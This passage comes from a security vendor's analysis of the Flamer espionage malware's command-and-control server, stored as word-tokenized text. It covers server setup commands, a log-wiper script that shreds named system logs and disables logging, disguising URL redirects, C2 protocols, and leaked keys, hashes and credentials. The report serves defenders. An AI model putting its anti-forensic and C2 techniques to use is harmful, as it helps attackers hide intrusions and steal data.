"to", "add", "entry", "(stolen", "data)"], ["python", "__main__", ".", "py", "2", "1-2", "1", "\"127", ".", "0.0.1\"", "100"], ["Simulator", "test", "to", "retrieve", "news", "entry", "(payload)"], ["nano", "/etc/apache2/ports", ".", "conf"], ["Configures", "Web", "server", "to", "listen", "on", "TCP", "port", "443"], ["cp", "/home/[USERNAME]/LogWiper_fixed", ".", "txt", "/LogWiper", ".", "sh"], ["Prepares", "log", "wiper", "file", "as", "BASH", "script"], ["sh", "/LogWiper", ".", "sh"], ["Wipes", "logs", "and", "disables", "logging", "services"], ["mkdir", "/var/www/common/"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["mkdir", "/var/www/wp-content/"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["mkdir", "/var/www/pages/"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["mkdir", "/var/www/services/"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["nano", "/etc/apache2/sites-enabled/default-ssl"], ["Sets", "up", "URL", "redirects"], ["mkdir", "-p", "/var/www/cgi-bin"], ["Creates", "folders", "to", "be", "used", "in", "redirection"], ["mkdir", "-p", "/var/www/htdocs/newsforyou"], ["Create", "Web", "appplication", "folder"], ["php5", "", ".", "./DB_creation_script.php"], ["Creates", "database"], ["/etc/init", ".", "d/apache2", "restart"], ["Restarts", "Web", "server"], ["iptables", "-A", "INPUT", "-p", "tcp", "--dport", "22", "-j", "ACCEPT"], ["Accepts", "connections", "on", "TCP", "port", "22(SSH)"], ["iptables", "-A", "INPUT", "-p", "tcp", "--dport", "443", "-j", "ACCEPT"], ["Accepts", "connections", "on", "TCP", "port", "443(HTTPS)"], ["Following", "these", "commands", ",", "the", "Apache", "server", "was", "configured", "to", "listen", "on", "TCP", "ports", "443", "and", "8080", ".", "The", "firewall"], ["was", "also", "reconfigured", "to", "allow", "connections", "over", "SSH", "and", "HTTPS", ".", "Logging", "activities", "were", "disabled", "and", "existing"], ["log", "files", "were", "securely", "deleted", "where", "necessary", ".", "The", "server", "is", "now", "ready", "to", "interact", "with", "compromised", "Flamer"], ["clients", "through", "the", "Newsforyou", "application", "."], ["The", "attackers", "also", "set", "up", "some", "URL", "redirections", "to", "disguise", "the", "true", "nature", "of", "the", "requests", "to", "an", "inexperienced"], ["eye", ".", "They", "would", "appear", "to", "look", "like", "legitimate", "requests", "for", "regular", "looking", "folder", "names", ".", "An", "example", "of", "one", "of"], ["the", "redirect", "rules", "is", "shown", "below:"], ["/etc/apache2/sites-available/default-ssl"], ["Page", "4"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["ScriptAlias", "/cgi-bin/", "/var/www/cgi-bin/"], ["<Directory", "\u201c/var/www/cgi-bin\u201d>"], ["AllowOverride", "None"], ["Options", "+ExecCGI", "-MultiViews", "+SymLinksIfOwnerMatch"], ["Order", "allow", ",", "deny"], ["Allow", "from", "all"], ["RewriteEngine", "on"], ["RewriteRule", "^counter\\", ".", "cgi$", "/newsforyou/index", ".", "php"], ["</Directory>"], ["Scheduled", "tasks"], ["A", "cronjob", "was", "set", "up", "to", "periodically", "delete", "files", "from", "the", "file", "system", "and", "remove", "older", "entries", "from", "the", "database:"], ["/etc/cron", ".", "newsforyou"], ["Table", "3"], ["Repeat", "Interval"], ["Command"], ["2", "minutes"], ["/var/www/htdocs/newsforyou/UnloadChecker", ".", "php", ">>", "/var/log/newsforyou", ".", "log"], ["6", "hours"], ["*", "python", "/home/[USERNAME]/pycleaner/Eraser", ".", "py"], ["@Midnight"], ["php", "/home/[USERNAME]/delete", ".", "php"], ["UnloadChecker", ".", "php,", "which", "is"], ["executed", "every", "two", "minutes", ","], ["retrieves", "data", "uploaded", "from", "the"], ["compromised", "computer", "and", "places"], ["it", "in", "a", "tar", "archive", ".", "The", "archive"], ["could", "then", "be", "downloaded", "by", "the"], ["operators", ".", "Eraser", ".", "py", "is", "a", "script", "used"], ["to", "wipe", "certain", "files", "and", "content"], ["from", "folders", ".", "On", "one", "of", "the", "servers"], ["the", "operators", "made", "an", "error", "when"], ["setting", "up", "the", "scheduled", "task", ".", "They"], ["used", "the", "folder", "name", "pycleaner"], ["when", "creating", "the", "task", ",", "but", "this"], ["folder", "does", "not", "exist", ".", "The", "folder"], ["containing", "the", "script", "is", "pycleanscr", "."], ["As", "a", "result", ",", "the", "Eraser", ".", "py", "script", "was"], ["never", "automatically", "executed", "."], ["Figure", "2"], ["Communications", "between", "C&C", "server", "and", "compromised"], ["computers"], ["Figure", "2", "illustrates", "the", "simple", "setup"], ["now", "in", "place", "for", "communicating", "with"], ["W32", ".", "Flamer", "compromised", "clients", "."], ["The", "next", "sections", "discuss", "the", "files"], ["and", "applications", "of", "most", "interest", "to"], ["the", "investigation", ",", "along", "with", "their"], ["locations", ".", "The", "analysis", "begins", "in", "the"], ["home", "directory", "of", "the", "unique", "added"], ["user", ",", "a", "folder", "that", "is", "created", "once"], ["the", "user", "is", "added", "during", "the", "initial"], ["set", "up", ".", "The", "usernames", "here", "were"], ["Page", "5"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["short", "three-letter", "names", ",", "unique", "to", "each", "server", "."], ["The", "home", "directory"], ["Location:", "/home/[USERNAME]"], ["The", "following", "table", "contains", "the", "location", "and", "a", "brief", "description", "of", "the", "files", "and", "folders", "present", "in", "the", "user\u2019s"], ["home", "directory:"], ["Table", "4"], ["File/Directory"], ["Description"], ["", ".", "/.bashrc"], ["Standard", "", ".", "bashrc", "with", "no", "modifications"], ["Simulator/"], ["Python", "application", "used", "to", "test", "the", "Newsforyou", "application"], ["pycleanscr/"], ["Python", "application", "used", "to", "free", "up", "disk", "space", "if", "necessary"], ["", ".", "/LogWiper_fixed.txt"], ["Script", "which", "disables", "logging", "and", "securely", "deletes", "specific", "log", "files"], ["", ".", "/RequestHandler.php"], ["Used", "in", "the", "Newsforyou", "Web", "application"], ["", ".", "/Delete.php"], ["PHP", "script", "which", "delete", "files", "and", "entries", "in", "the", "MySQL", "database"], ["Stress", "testing", "the", "application"], ["Simulator"], ["This", "application", "consists", "of", "a", "set", "of", "Python", "scripts", ",", "which", "are", "used", "to", "stress", "test", "the", "Newsforyou", "application", "."], ["This", "application", "was", "only", "present", "on", "one", "of", "the", "servers", ".", "The", "application", "connects", "to", "a", "chosen", "server", "and", "issues"], ["various", "queries", "that", "conform", "to", "the", "C&C", "server", "protocol", ".", "The", "tests", "performed", "during", "the", "set", "up", "were", "to", "add", "an"], ["entry", "(stolen", "data)", "and", "to", "retrieve", "a", "news", "entry", "(payload)", "."], ["A", "point", "of", "interest", "here", "is", "the", "presence", "of", "dnslocation", ".", "info", "as", "part", "of", "the", "HTTP", "request", "header", "the", "script", "builds", "in"], ["a", "file", "named", "Connection", ".", "py.", "This", "is", "a", "known", "Flamer", "C&C", "server", "domain", ",", "indicating", "that", "the", "code", "is", "being", "shared"], ["and", "used", "to", "test", "across", "various", "C&C", "servers", ".", "The", "timestamp", "on", "this", "file", "supports", "this", "idea", "as", "it", "is", "stamped", "March"], ["22", ",", "2012", "."], ["When", "a", "Python", "script", "is", "executed", ",", "a", "compiled", "Python", "file", "(", ".", "pyc)", "is", "generated", ".", "Examining", "these", "files", ",", "we", "confirmed"], ["this", "application", "was", "executed", "on", "May", "18", "which", "corroborates", "our", "finding", "about", "the", "system", "configuration", "date", "."], ["Page", "6"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["Cleaning", "up"], ["pycleanscr"], ["pycleanscr", "checks", "how", "much", "free", "disk", "space", "is", "available", "on", "the", "root", "partition", ".", "It", "deletes", "the", "files", "in", "/var/www/"], ["htdocs/newsforyou/tmp/", "if", "the", "amount", "of", "the", "disk", "space", "in", "use", "is", "greater", "than", "75", "percent", "."], ["Delete", ".", "php"], ["Deletes", "entries", "in", "the", "news_entries", "table", "of", "the", "MySQL", "database", "and", "securely", "deletes", "the", "files", "referenced", "by"], ["that", "entry", "on", "disk", "that", "are", "older", "than", "30", "days", "."], ["Disabling", "logging"], ["LogWiper_fixed", ".", "txt"], ["This", "", ".", "txt", "file", "is", "renamed", "to", "a", "", ".", "sh", "BASH", "script", "and", "run", "to", "disable", "logging", "services", ",", "to", "securely", "delete", "any", "prior", "log"], ["files", "created", ",", "and", "to", "disable", "logging", "in", "two", "particular", "applications", "required", "by", "the", "attackers:", "Apache", "and", "SSH", "."], ["Table", "5"], ["Log", "files", "deleted"], ["Services", "disabled"], ["Services", "with", "logging", "disabled"], ["/var/log/wtmp"], ["Rsyslog"], ["Apache"], ["/var/log/lastlog"], ["Sysklogd"], ["SSH"], ["/var/run/utmp"], ["Msyslog"], ["/var/log/mail", ".", "*"], ["syslog-ng"], ["/var/log/syslog*"], ["/var/log/messages"], ["hidden", "files", "in", "/root", "and", "/"], ["home"], ["/var/log/auth/*"], ["/var/log/apache2/*"], ["Files", "are", "securely", "deleted", "using", "Shred", ",", "a", "tool", "that", "repeatedly", "overwrites", "files", "to", "prevent", "their", "recovery", ",", "even"], ["forensically", "."], ["The", "next", "section", "will", "discuss", "the", "Web", "application", "processing", "the", "compromised", "W32", ".", "Flamer", "client", "requests", "."], ["The", "Web", "application"], ["Location:", "/var/www/htdocs/newsforyou/"], ["The", "Newsforyou", "application", "is", "written", "in", "PHP", "and", "contains", "the", "primary", "command-and-control", "functionality", "split"], ["into", "two", "parts:", "the", "main", "module", "and", "the", "control", "panel", ".", "The", "control", "panel", "is", "a", "basic", "user", "interface", "which", "allows"], ["packages", "to", "be", "uploaded", "and", "installed", "on", "chosen", "W32", ".", "Flamer", "clients", ".", "It", "also", "allows", "for", "the", "retrieval", "of", "stolen"], ["data", "that", "had", "been", "uploaded", "from", "these", "clients", "."], ["Page", "7"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["The", "table", "below", "describes", "the", "layout", "and", "offers", "a", "brief", "description", "of", "the", "components", "of", "the", "Newsforyou"], ["application:"], ["Table", "6"], ["Directories"], ["Description"], ["/newsforyou"], ["Main", "command", "and", "control", "application"], ["/newsforyou/news"], ["Encrypted", "packages", "distributed", "to", "all", "infected", "clients*"], ["/newsforyou/ads"], ["Encrypted", "packages", "distributed", "to", "chosen", "infected", "clients**"], ["/newsforyou/entries"], ["Encrypted", "data", "uploaded", "from", "infected", "clients**"], ["/newsforyou/files"], ["Temporary", "location", "for", "files", "when", "creating", "unloads"], ["/newsforyou/tmp"], ["Temporary", "files", "(database", "exports", ",", "tar", "archives)"], ["/newsforyou/bak"], ["Archives", "generated", "when", "unloading"], ["/newsforyou/CP"], ["Control", "panel"], ["*Symmetric", "encryption", "with", "known", "key"], ["**Asymmetric", "encryption", "with", "known", "public", "key", ",", "private", "key", "unknown"], ["The", "application", "is", "designed", "to", "resemble", "a", "simple", "news/blog", "application", ".", "This", "approach", "may", "serve", "to", "disguise"], ["the", "true", "nature", "of", "the", "application", "from", "any", "automation", "or", "casual", "inspection", ".", "Although", "the", "code", "was", "running", "on"], ["a", "Linux", "server", ",", "it", "is", "likely", "some", "of", "the", "command-and-control", "servers", "were", "running", "Windows", ",", "or", "at", "least", "that", "the"], ["code", "was", "developed", "and", "tested", "on", "Windows", "computers", "."], ["The", "following", "comment", "was", "present", "in", "one", "of", "the", "PHP", "files:"], ["--", "This", "function", "was", "added", "by", "D***", ",", "returns", "a", "true/false", "value"], ["depending", "on", "if", "this", "is", "a", "Windows", "box"], ["Authors"], ["The", "PHP", "source", "code", "references", "four", "authors", ",", "identified", "in", "the", "table", "below", ",", "and", "also", "attributes", "to", "them"], ["particular", "functionality", "within", "the", "code:"], ["Table", "7"], ["@author", "Edited", "Files", "Dates"], ["D***"], ["33"], ["12/4/2006"], ["01/23/2007"], ["H*****"], ["10"], ["09/02/2007"], ["O******"], ["4"], ["12/3/2006"], ["R***"], ["1"], ["2011"], ["Control", "Panel", "Protocols", "Database", "Cleanup", "Encryption"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["X"], ["It", "is", "clear", "that", "D***", "and", "H*****", "had", "the", "most", "input", "into", "the", "project", ",", "having", "edited", "the", "most", "files", "in", "the"], ["application", ".", "O******", "and", "R***", "were", "tasked", "with", "database", "and", "cleanup", "operations", "and", "could", "easily", "have", "had", "little"], ["or", "no", "understanding", "of", "the", "inner", "workings", "of", "the", "application", "."], ["However", ",", "D***", "and", "H*****", "have", "direct", "involvement", "in", "handling", "interactions", "with", "clients", ",", "as", "they", "worked", "on", "the"], ["protocols", "and", "also", "worked", "on", "the", "control", "panel", "that", "the", "operators", "used", ".", "It", "is", "likely", "D***", "and", "O******", "knew", "each"], ["other", ",", "as", "they", "both", "worked", "on", "the", "same", "files", "and", "during", "a", "similar", "time", "period", "in", "December", "2006", "."], ["Page", "8"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["H*****", "is", "responsible", "for", "the", "SignupProtocol", ",", "while", "D***", "is", "involved", "in", "the", "OldProtocol", "(Flamer)", ",", "both", "of", "which"], ["will", "be", "discussed", "in", "more", "detail", "in", "the", "next", "section", "."], ["Protocols"], ["The", "main", "module", "communicating", "with", "the", "compromised", "clients", "is", "index", ".", "php.", "It", "deciphers", "the", "protocol", "then"], ["logs", ",", "decodes", ",", "and", "processes", "requests", ".", "Four", "protocols", "have", "been", "identified", ",", "of", "which", "three", "are", "in", "use", ".", "The", "Red"], ["protocol", "has", "not", "been", "implemented", "yet", "."], ["The", "existence", "of", "three", "supported", "protocols", ",", "along", "with", "one", "protocol", "under", "development", ",", "confirms", "the", "C&C"], ["server\u2019s", "requirement", "to", "communicate", "with", "multiple", "evolutions", "(variants)", "of", "W32", ".", "Flamer", "or", "additional", "cyberespionage", "malware", "families", "currently", "unknown", "to", "the", "public", "."], ["Page", "9"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["These", "protocols", "are", "identified", "in", "the", "table", "below:"], ["Table", "8"], ["Protocol", "Identifier"], ["Protocol"], ["Request"], ["PROTOCOL_OLD*"], ["HTTPS"], ["UNIQUE_NUMBER=[DIGITS]&PASSWORD=LifeStyle2"], ["PROTOCOL_SIGNUP"], ["HTTPS"], ["uid=[DIGITS]&action=[DIGITS]"], ["PROTOCOL_OLD_E**"], ["HTTP"], ["NOT(uid=[DIGITS]&action=[DIGITS])"], ["PROTOCOL_RED"], ["N/A"], ["N/A"], ["*Used", "by", "W32", ".", "Flamer"], ["**PROTOCOL_OLD", "with", "custom", "encryption", "over", "HTTP"], ["Specific", "requests", "handled", "by", "the", "application", "are:"], ["Table", "9"], ["Request"], ["Functionality"], ["GetNewsHandler"], ["Responsible", "for", "sending", "news", "to", "compromised", "clients"], ["AddEntryHandler"], ["Responsible", "for", "storing", "entries", "(stolen", "data)", "from", "compromised", "clients"], ["GetAdHandler"], ["Responsible", "for", "sending", "ads", "to", "compromised", "clients"], ["The", "possibility", "that", "multiple", "Trojans", ",", "or", "at", "least", "evolutions", "of", "W32", ".", "Flamer,", "are", "at", "work", "here", "is", "backed", "up", "by", "the"], ["fact", "that", "four", "different", "IDs", "are", "used", "internally", "to", "identify", "them:"], ["Table", "10"], ["Client"], ["Internal", "ID"], ["Protocol"], ["Threat"], ["CLIENT_TYPE_SP"], ["1"], ["PROTOCOL_OLD"], ["Unknown"], ["CLIENT_TYPE_SPE"], ["2"], ["PROTOCOL_OLD_E"], ["Unknown"], ["CLIENT_TYPE_FL"], ["3"], ["PROTOCOL_OLD"], ["W32", ".", "Flamer"], ["CLIENT_TYPE_IP"], ["6"], ["PROTOCOL_SIGNUP"], ["Unknown"], ["N/A"], ["N/A"], ["PROTOCOL_RED"], ["Unknown"], ["Page", "10"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["Here", "is", "a", "snippet", "of", "code", "that", "identified", "connecting", "clients:"], ["It", "is", "likely", "here", "that", "CLIENT_TYPE_SP", ",", "CLIENT_TYPE_SPE", ",", "and", "CLIENT_TYPE_FL", "implemented", "by", "D***", "are", "evolutions"], ["of", "the", "same", "threat", ".", "However", ",", "CLIENT_TYPE_IP", "which", "is", "implemented", "by", "H*****", "appears", "to", "come", "after", "the", "in-use"], ["Flamer", "protocol", ",", "which", "suggests", "that", "either", "new", "variants", "exist", "that", "we", "are", "unaware", "of", ",", "or", "there", "is", "a", "separate", "Trojan"], ["at", "work", ".", "They", "also", "included", "an", "unrecognized", "fallback", "for", "clients", "."], ["Stolen", "Data"], ["Compromised", "clients", "upload", "stolen", "data", "to", "the", "entries", "directory", ".", "Files", "stored", "in", "this", "directory", "are", "encrypted", "with", "a"], ["public", "key", "stored", "in", "the", "database", ".", "These", "files", "cannot", "be", "decrypted", "without", "the", "corresponding", "private", "key", ".", "There", "was"], ["a", "file", "of", "157", ",", "548", "bytes", "still", "left", "on", "the", "server", "that", "the", "operators", "did", "not", "have", "the", "opportunity", "to", "download", "."], ["The", "stolen", "data", "is", "encrypted", "with", "this", "public", "key", "on", "the", "server", ",", "thus", "requiring", "the", "corresponding", "unknown", "private", "key"], ["to", "decrypt:"], ["-----BEGIN", "PUBLIC", "KEY----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtZslxFiR9KJE05Nhh7Xk"], ["+lVVpD9F6AQnvZeknDiwL3SBjZB/dB/LLXtwiet8LUS6JYCXnaIq4NxW1PymwGFZ"], ["zuc/B3p+ZAFPt06veOHOfaMAI0KDMb+laNPINvn/jJ8TfvCaUMUuMEY4sayh0xwD"], ["MwSAazMYI8rvaaS/BqhI/6vPN6D02UIpwT1TSBVeRRoPBHuYE7A93b8vJw9sBGIp"], ["KXZ90sgP1CjdAmCbhYelelninKdeTKCGvd5YXt86grWgEVf5WXzxXi3ZK1T4w0Yt"], ["mNhUEAwS7zCdtZ+Ak8b0M83wAirASvPZiBl6qF8hqCT5pKkwgBG//kk8JicboLsM"], ["VQIDAQAB"], ["-----END", "PUBLIC", "KEY----Based", "on", "timestamps", "seen", "on", "the", "first", "server", "in", "the", "/newsforyou/bak", "directory", "we", "determined", "that", "the", "operators"], ["downloaded", "the", "stolen", "data", "on", "four", "separate", "dates", "in", "May", "."], ["Table", "11"], ["Date"], ["Stolen", "data", "files"], ["2012-05-22"], ["112"], ["2012-05-23"], ["12"], ["2012-05-24"], ["11"], ["2012-05-30"], ["43"], ["Page", "11"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["A", "total", "of", "around", "75", "MB", "of", "stolen", "data", "was", "found", "in", "the", "backups", "on", "one", "of", "the", "servers", "(server", "#1)", ".", "Although", "the"], ["timing", "data", "is", "limited", "here", ",", "the", "timestamps", "of", "these", "backups", "suggest", "that", "the", "operators", "could", "be", "in", "the", "EMEA", "region", "."], ["There", "was", "a", "four-day", "delay", "from", "the", "initial", "setup", "to", "when", "the", "operators", "began", "to", "retrieve", "stolen", "data", ".", "This", "is", "a"], ["possible", "indicator", "that", "the", "information", "about", "the", "new", "server", "had", "to", "take", "time", "to", "filter", "down", "to", "them", "."], ["Figure", "3", ".", "1"], ["Megabytes", "of", "stolen", "data", "by", "date", ",", "server", "#1"], ["In", "comparison", ",", "the", "other", "server", "(server", "#2)", "saw", "a", "massive", "5", ".", "7", "GB", "of", "stolen", "data:"], ["Figure", "3", ".", "2"], ["Megabytes", "of", "stolen", "data", "by", "date", ",", "server", "#2"], ["Page", "12"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Activity"], ["By", "examining", "the", "files", "in", "the", "bak", "directories", ",", "specifically", "the", "number", "of", "files", "contained", "within", "the", "backup", "archives"], ["created", "each", "day", ",", "it", "is", "possible", "to", "obtain", "an", "indication", "of", "the", "activity", "of", "the", "C&C", "server", ",", "which", "can", "be", "seen", "in", "the"], ["chart", "below:"], ["Figure", "4", ".", "1"], ["Number", "of", "backup", "archives", "created", "each", "day", ",", "server", "#1"], ["Figure", "4", ".", "2"], ["Number", "of", "backup", "archives", "created", "each", "day", ",", "server", "#2"], ["On", "the", "first", "server", ",", "there", "is", "a", "clear", "increase", "in", "activity", "around", "May", "20", ",", "which", "then", "drops", "off", ".", "This", "is", "to", "be", "expected", "as"], ["computers", "are", "cleared", "up", "."], ["On", "the", "second", "server", "the", "Flamer", "operation", "is", "in", "full", "flow", "and", "huge", "volumes", "of", "files", "are", "being", "created", "on", "the", "system", "."], ["Page", "13"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["Payload"], ["The", "news", "directory", "contains", "a", "compressed", "and", "encrypted", "file", "for", "distribution", "to", "the", "compromised", "clients", "connecting"], ["to", "the", "server", ".", "This", "file", "is", "encrypted", "with", "a", "known", "symmetric", "key", "retrieved", "from", "the", "database", "."], ["Table", "12"], ["MD5"], ["Filename"], ["File", "size"], ["0xfccd97e2513089e74ba707bbf4c1b0e5"], ["59c5452fb2ba21091513ccdc1e0ec7fd"], ["204", ",", "024", "bytes"], ["This", "is", "the", "browse32", ".", "ocx", "Flamer", "module", ",", "the", "sole", "purpose", "of", "which", "is", "to", "remove", "all", "known", "traces", "of", "the", "Flamer"], ["malware", "from", "the", "compromised", "client", "."], ["The", "payload", "is", "encrypted", "with", "this", "symmetric", "key:"], ["R&^T&IOHIO%^&^E%@#$UIO*()"], ["The", "control", "panel"], ["Access", "to", "the", "Flamer", "control", "panel", "requires", "authentication:"], ["Figure", "5"], ["Control", "panel", "login", "page"], ["The", "following", "credentials", "are", "used", "to", "gain", "access", "to", "the", "control", "panel", "(only", "the", "MD5", "password", "hash", "is", "available;"], ["attempts", "to", "crack", "the", "password", "were", "unsuccessful):"], ["Username:", "username"], ["Password", "Hash:", "27934e96d90d06818674b98bec7230fa"], ["The", "control", "panel", "for", "interacting", "with", "Flamer-compromised", "computers", "is", "very", "basic", ".", "The", "simple", "interface", "allows", "the"], ["operators", "to", "upload", "packages", "and", "download", "encrypted", "data", "stolen", "from", "the", "compromised", "clients", ".", "The", "operator", "is"], ["required", "to", "upload", "specially", "crafted", "tar", ".", "gz", "files", ".", "The", "archived", "filename", "needs", "to", "follow", "a", "specific", "format", ",", "which", "is"], ["parsed", "and", "then", "stored", "in", "the", "ads", "or", "news", "directory", ",", "depending", "on", "the", "file", "extension", "used", "."], ["The", "filename", "format", "for", "these", "packages", "is", "as", "follows:"], ["[USER", "_", "TYPE]", "_", "[USER", "_", "ID]", "_", "[PRIORITY]", "_", "[TEMP", "_", "FLAG][OPTIONAL", "_", "AND", "_", "IGNORED]", ".", "news"], ["[USER", "_", "TYPE]", "_", "[USER", "_", "ID]", "_", "[EXPIRY", "_", "TIME]", "_", "[AD", "_", "NAME]", ".", "ad"], ["Page", "14"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["The", "following", "is", "a", "screen", "shot", "of", "the", "control", "panel", "that", "allows", "the", "operator", "to", "upload", "data", "to", "the", "server:"], ["Figure", "6"], ["Control", "panel", "data", "upload", "screen"], ["This", "approach", "to", "uploading", "packages", "and", "downloading", "data", "fits", "the", "profile", "of", "military", "and", "intelligence", "operations", "."], ["A", "typical", "control", "panel", "is", "easy", "to", "use", "and", "self-explanatory", ".", "The", "operator", "has", "full", "control", "over", "what", "to", "do", "with", "the"], ["compromised", "clients", "and", "has", "the", "ability", "to", "retrieve", "and", "inspect", "the", "stolen", "information", ".", "The", "Flamer", "control", "panel"], ["provides", "limited", "capabilities", "to", "the", "operator", ",", "preventing", "them", "from", "viewing", "and", "interpreting", "the", "information", "being"], ["exchanged", "."], ["This", "approach", "would", "help", "prevent", "operators", "from", "knowing", "what", "is", "contained", "within", "the", "packages", "or", "the", "significance"], ["of", "the", "data", "being", "exchanged", "between", "clients", "and", "the", "attackers", ".", "Such", "a", "design", "would", "also", "serve", "as", "a", "defensive"], ["measure", "as", "it", "would", "prevent", "arbitrary", "packages", "from", "being", "uploaded", "and", "prevent", "downloaded", "data", "being", "from", "being"], ["inspected", "by", "unknown", "parties", "that", "may", "have", "gained", "access", "to", "the", "control", "panel", "."], ["The", "following", "screen", "on", "the", "control", "panel", "allows", "the", "user", "to", "view", "and", "download", "backed", "up", "data", "from", "the", "server:"], ["Figure", "7"], ["Control", "panel", "screen", "for", "downloading", "stolen", "data"], ["Page", "15"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["The", "tar", ".", "gz", "contains", "all", "the", "relevant", "stolen", "data", "and", "details", "of", "where", "the", "information", "was", "stolen", "from", ".", "The", "private", "key"], ["is", "required", "here", "to", "inspect", "the", "encrypted", "data", "."], ["The", "database"], ["Location:", "/var/lib/mysql"], ["The", "database", "is", "used", "to", "store", "the", "relevant", "data", "about", "connecting", "clients", ",", "packages", "to", "send", "to", "the", "clients", ",", "some"], ["logging", "and", "settings", "required", "for", "encryption", ",", "and", "authentication", "to", "access", "the", "control", "panel", "."], ["Table", "13"], ["Database"], ["User"], ["Password"], ["MySQL"], ["news_user"], ["news_pass"], ["Schema"], ["The", "database", "is", "used", "to", "store", "the", "relevant", "data", "about", "connecting", "clients", ",", "packages", "to", "send", "to", "the", "clients", ",", "some"], ["logging", "and", "settings", "required", "for", "encryption", ",", "and", "authentication", "to", "access", "the", "control", "panel", "."], ["Figure", "8"], ["Newsforyou", "application", "database", "schema"], ["Page", "16"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["The", "session_log", ",", "log", ",", "and", "client_log", "are", "all", "encrypted", "using", "the", "keys", "stored", "in", "the", "settings", "table", "shown", "below", "and"], ["were", "successfully", "decrypted:"], ["Table", "14"], ["Variable"], ["Value"], ["is_online"], ["True"], ["cp_user"], ["username"], ["cp_hash", "8"], ["27934e96d90d06818674b98bec7230fa"], ["max_backup_size"], ["52428800"], ["version"], ["1", ".", "4.11.4.1"], ["minimum_unload_size"], ["1572864"], ["unload_flag"], ["0"], ["general_key"], ["acK3xKMoJzsa9AVvtg59+OT4RM/x5MQ3bO2p0j+5Jd0="], ["session_key"], ["13eZ+Now4Pt5ATpPv3WUv1E8UrvJReVMD0pO0MTQqoI="], ["The", "database", "is", "regularly", "emptied", "by", "the", "delete", ".", "php", "script;", "there", "is", "limited", "data", "in", "it", ".", "The", "following", "table", "gives", "a", "brief"], ["description", "of", "the", "tables", "found", "in", "the", "database:"], ["Table", "15"], ["Table"], ["Records"], ["Record", "Id", "Encryption"], ["Description"], ["settings"], ["11"], ["11"], ["N"], ["Configuration", "values", "listed", "in", "the", "table", "below"], ["session_log"], ["8"], ["1144"], ["Y"], ["Encrypted", "session", "log"], ["client_log"], ["4"], ["1071"], ["Y"], ["Encrypted", "client", "log"], ["log"], ["213"], ["21259"], ["Y"], ["Encrypted", "logs"], ["news_entries"], ["1"], ["1"], ["N"], ["Entries", "in", "newsforyou/news", "(payloads)"], ["blog_entries"], ["1"], ["189"], ["N"], ["Entries", "in", "newsforyou/entries", "(stolen", "data)"], ["ads"], ["0"], ["n/a"], ["N"], ["Ad", "files", "in", "newsforyou/ads/"], ["backup"], ["4"], ["4"], ["N"], ["Backup", "files", "in", "newsforyou/bak/"], ["The", "session_log", "table", "contains", "details", "of", "all", "connections", "to", "the", "server", "while", "client_log", "only", "contains", "connections"], ["with", "a", "recognized", "protocol", "(e", ".", "g.", "valid", "compromised", "computers)", "."], ["Examining", "the", "data", "in", "the", "table", "indicates", "that", "1071", "valid", "requests", "were", "recorded", "from", "compromised", "clients", ".", "A"], ["decrypted", "client", "log", "entry", "contains", "the", "following", "information:"], ["CLIENT", "_", "ID:[UUID]"], ["CLIENT", "_", "TYPE:3"], ["CLIENT", "_", "VERSION:0"], ["REQUEST", "_", "TYPE:0"], ["RAW", "_", "REQUEST:UNIQUE", "_", "NUMBER=[UUID]&PASSWORD=LifeStyle2&ACTION=1&FILE", "_"], ["NAME=&FILE", "_", "SIZE=0"], ["PROTOCOL:1"], ["The", "four", "encrypted", "requests", "in", "the", "database", "on", "the", "first", "server", "are", "W32", ".", "Flamer", "client", "requests", ",", "which", "use", "the", "old"], ["protocol:"], ["\u2022", "CLIENT"], ["\u2022", "PROTOCOL"], ["="], ["="], ["3"], ["1"], ["="], ["="], ["CLIENT_TYPE_FL"], ["OLD_PROTOCOL"], ["Page", "17"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Security", "Response"], ["The", "additional", "sessions", "logged", "are", "likely", "attributed", "to", "researchers", "who", "had", "discovered", "the", "whereabouts", "of", "the"], ["command-and-control", "servers", "."], ["Table", "16"], ["IP", "Address"], ["Organization"], ["Country"], ["client_log"], ["77", ".", "42.[REMOVED]"], ["LIBANTELECOM"], ["Lebanon"], ["Y"], ["37", ".", "8.", "[REMOVED]"], ["Israel", "Haifa", "Hadara", "Technologies", "Private", "Shareholding", "Company"], ["Israel"], ["Y"], ["37", ".", "75.", "[REMOVED]"], ["Orange", "Palestine", "Group", "Co", ".", "for", "Technological", "Inves"], ["Palestine"], ["Y"], ["79", ".", "212.", "[REMOVED]"], ["Deutsche", "Telekom", "AG"], ["Germany"], ["N"], ["95", ".", "211.", "[REMOVED]"], ["LeaseWeb", "B", ".", "V."], ["Netherlands"], ["N"], ["The", "session_log", "data", "contained", "three", "separate", "HTTP_HOST", "values", ",", 